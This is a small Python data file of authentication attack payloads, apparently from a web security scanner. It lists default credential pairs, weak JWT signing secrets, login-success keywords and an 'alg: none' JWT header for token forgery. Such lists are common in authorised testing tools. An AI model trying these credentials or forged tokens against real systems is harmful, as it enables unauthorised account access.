"""Authentication-related payloads."""

# Default / common credentials to attempt
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "password123"),
    ("admin", "123456"),
    ("admin", ""),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("administrator", "administrator"),
    ("test", "test"),
    ("guest", "guest"),
    ("user", "user"),
    ("demo", "demo"),
    ("admin", "letmein"),
    ("admin", "qwerty"),
    ("admin", "admin@123"),
]

# Weak JWT signing secrets to try
JWT_WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "qwerty",
    "admin",
    "changeme",
    "your-256-bit-secret",
    "supersecret",
    "jwt_secret",
    "mysecretkey",
    "",    # No secret (alg:none attack)
]

# Keywords in response body indicating successful auth
AUTH_SUCCESS_SIGS = [
    "token",
    "access_token",
    "jwt",
    "bearer",
    "welcome",
    "dashboard",
    "success",
    "logged in",
    "login successful",
    "authenticated",
]

# JWT algorithm confusion payloads
JWT_ALG_NONE_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"  # {"alg":"none","typ":"JWT"}
